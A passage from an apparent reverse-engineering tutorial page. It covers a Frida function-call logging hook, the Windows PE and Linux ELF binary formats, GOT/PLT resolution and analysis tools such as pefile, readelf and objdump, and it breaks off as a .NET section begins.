style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function-variable function" style="color:#d73a49">onMatch</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">exp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword control-flow" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exp</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">type</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">===</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;function&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token maybe-class-name">Interceptor</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exp</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">address</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function-variable function" style="color:#d73a49">onEnter</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;[Call] &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> exp</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">name</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; @ &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> exp</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">address</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function-variable function" style="color:#d73a49">onComplete</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="platform-specific-reversing">Platform-Specific Reversing<a href="#platform-specific-reversing" class="hash-link" aria-label="Direct link to Platform-Specific Reversing" title="Direct link to Platform-Specific Reversing" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="windows-pe-format">Windows PE Format<a href="#windows-pe-format" class="hash-link" aria-label="Direct link to Windows PE Format" title="Direct link to Windows PE Format" translate="no">​</a></h3>
<p><strong>PE (Portable Executable)</strong> is the binary format for Windows executables (.exe, .dll, .sys).</p>
<p><strong>PE structure:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DOS Header (MZ header)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DOS Stub (&quot;This program cannot be run in DOS mode&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PE Signature (&quot;PE\0\0&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">COFF Header (machine type, number of sections, timestamp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Optional Header (entry point, image base, section alignment)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Section Headers (.text, .data, .rdata, .rsrc)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sections (actual code and data)</span><br></span></code></pre></div></div>
<p><strong>Key PE components:</strong></p>
<p><strong>1. DOS Header (offset 0x0):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_IMAGE_DOS_HEADER</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WORD e_magic</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">// &quot;MZ&quot; (0x5A4D)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    LONG e_lfanew</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">     </span><span class="token comment" style="color:#999988;font-style:italic">// Offset to PE header</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> IMAGE_DOS_HEADER</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>2. PE Header:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_IMAGE_NT_HEADERS</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DWORD Signature</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic">// &quot;PE\0\0&quot; (0x4550)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IMAGE_FILE_HEADER FileHeader</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IMAGE_OPTIONAL_HEADER OptionalHeader</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> IMAGE_NT_HEADERS</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>3. Optional Header (contains entry point):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">_IMAGE_OPTIONAL_HEADER</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DWORD AddressOfEntryPoint</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// RVA of entry point</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DWORD ImageBase</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">// Preferred load address (e.g., 0x400000)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> IMAGE_OPTIONAL_HEADER</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>4. Sections:</strong></p>
<table><thead><tr><th>Section</th><th>Purpose</th></tr></thead><tbody><tr><td><code>.text</code></td><td>Executable code</td></tr><tr><td><code>.data</code></td><td>Initialized data (global variables)</td></tr><tr><td><code>.rdata</code></td><td>Read-only data (strings, constants)</td></tr><tr><td><code>.bss</code></td><td>Uninitialized data</td></tr><tr><td><code>.rsrc</code></td><td>Resources (icons, dialogs, version info)</td></tr><tr><td><code>.reloc</code></td><td>Relocation table (for ASLR)</td></tr></tbody></table>
<p><strong>5. Import Address Table (IAT):</strong></p>
<ul>
<li class="">List of imported functions from DLLs</li>
<li class="">Resolved at runtime by Windows loader</li>
</ul>
<p><strong>6. Export Address Table (EAT):</strong></p>
<ul>
<li class="">List of exported functions (for DLLs)</li>
</ul>
<p><strong>Analyzing PE with tools:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># PEview (Windows GUI):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://wjradburn.com/software/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Shows PE structure, sections, imports, exports</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># PE-bear (Windows GUI):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://github.com/hasherezade/pe-bear-releases</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Advanced PE editor and analyzer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># pefile (Python):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> pefile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">import</span><span class="token plain"> pefile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> pe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pefile.PE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;malware.exe&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pe.OPTIONAL_HEADER.AddressOfEntryPoint</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">section</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> pe.sections:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.     print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">section.Name.decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">section.VirtualAddress</span><span class="token punctuation" style="color:#393A34">))</span><br></span></code></pre></div></div>
<p><strong>Finding entry point:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pefile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pefile</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;malware.exe&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">entry_point_rva </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">OPTIONAL_HEADER</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">AddressOfEntryPoint</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">image_base </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">OPTIONAL_HEADER</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ImageBase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">entry_point_va </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> image_base </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> entry_point_rva</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;Entry point: 0x</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">entry_point_va</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">:</span><span class="token string-interpolation interpolation format-spec">X</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="linux-elf-format">Linux ELF Format<a href="#linux-elf-format" class="hash-link" aria-label="Direct link to Linux ELF Format" title="Direct link to Linux ELF Format" translate="no">​</a></h3>
<p><strong>ELF (Executable and Linkable Format)</strong> is the binary format for Linux/Unix executables.</p>
<p><strong>ELF structure:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ELF Header</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program Headers (segments for runtime)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Section Headers (.text, .data, .bss, .rodata, etc.)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sections (actual code and data)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Symbol Table (functions, variables)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String Table (symbol names)</span><br></span></code></pre></div></div>
<p><strong>Key ELF components:</strong></p>
<p><strong>1. ELF Header:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> e_ident</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Magic: 0x7F, &#x27;E&#x27;, &#x27;L&#x27;, &#x27;F&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">uint16_t</span><span class="token plain"> e_type</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">// Type: ET_EXEC (executable), ET_DYN (shared object)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">uint16_t</span><span class="token plain"> e_machine</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic">// Architecture: EM_386 (x86), EM_X86_64 (x64), EM_ARM</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">uint64_t</span><span class="token plain"> e_entry</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic">// Entry point address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> Elf64_Ehdr</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>2. Program Headers (segments):</strong></p>
<ul>
<li class=""><code>LOAD</code>: Loadable segment (mapped into memory)</li>
<li class=""><code>DYNAMIC</code>: Dynamic linking information</li>
<li class=""><code>INTERP</code>: Path to interpreter (e.g., /lib64/ld-linux-x86-64.so.2)</li>
</ul>
<p><strong>3. Sections:</strong></p>
<table><thead><tr><th>Section</th><th>Purpose</th></tr></thead><tbody><tr><td><code>.text</code></td><td>Executable code</td></tr><tr><td><code>.data</code></td><td>Initialized data</td></tr><tr><td><code>.bss</code></td><td>Uninitialized data</td></tr><tr><td><code>.rodata</code></td><td>Read-only data (strings)</td></tr><tr><td><code>.plt</code></td><td>Procedure Linkage Table (for dynamic linking)</td></tr><tr><td><code>.got</code></td><td>Global Offset Table (addresses of imported functions)</td></tr><tr><td><code>.symtab</code></td><td>Symbol table</td></tr><tr><td><code>.strtab</code></td><td>String table</td></tr></tbody></table>
<p><strong>4. GOT (Global Offset Table) and PLT (Procedure Linkage Table):</strong></p>
<ul>
<li class=""><strong>GOT:</strong> Contains addresses of external functions (resolved at runtime)</li>
<li class=""><strong>PLT:</strong> Stub code that jumps to GOT entries</li>
</ul>
<p><strong>Example (calling printf):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; First call to printf:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call printf@plt         ; Jump to PLT stub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; PLT stub:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf@plt:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jmp [printf@got]        ; Jump to address in GOT (initially resolver)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 0                  ; Push relocation index</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jmp _dl_runtime_resolve ; Resolve printf address, update GOT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Subsequent calls:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call printf@plt         ; Jump to PLT stub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf@plt:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jmp [printf@got]        ; GOT now contains real printf address</span><br></span></code></pre></div></div>
<p><strong>Analyzing ELF with tools:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># readelf (view ELF headers):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readelf </span><span class="token parameter variable" style="color:#36acaa">-h</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># ELF header</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readelf </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># Program headers (segments)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readelf </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># Section headers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readelf </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># Symbol table</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readelf </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># Relocations</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># objdump (disassemble):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objdump </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># Disassemble .text section</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objdump </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> program         </span><span class="token comment" style="color:#999988;font-style:italic"># Disassemble all sections</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objdump </span><span class="token parameter variable" style="color:#36acaa">-M</span><span class="token plain"> intel </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> program  </span><span class="token comment" style="color:#999988;font-style:italic"># Intel syntax</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># file (identify file type):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: ELF 64-bit LSB executable, x86-64</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ldd (list dynamic dependencies):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ldd program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6</span><br></span></code></pre></div></div>
<p><strong>Finding entry point:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">readelf </span><span class="token parameter variable" style="color:#36acaa">-h</span><span class="token plain"> program </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> Entry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: Entry point address: 0x401050</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="net-reversing">.NET Reversing<a href="#net-reversing" class="hash-link" aria-label="Direct link to .NET Reversing" title="Direct link to .NET Reversing" translate="no">​</a></h3>
<p><strong>.NET assemblies</strong> are compiled to CIL (Common Intermediate Language), not native code.</p>
<p><strong>Why .NET is easier to reverse:</strong></p>
<ul>
<li class="">CIL is high-level (closer to source code than assembly)</li>
<li class="">Metadata preserves class/method/variable names (unless obfuscated)</li>
<li class="">Decompilers produce near-source-quality C# code</li>
</ul>
<p><strong>Tools:</strong></p>
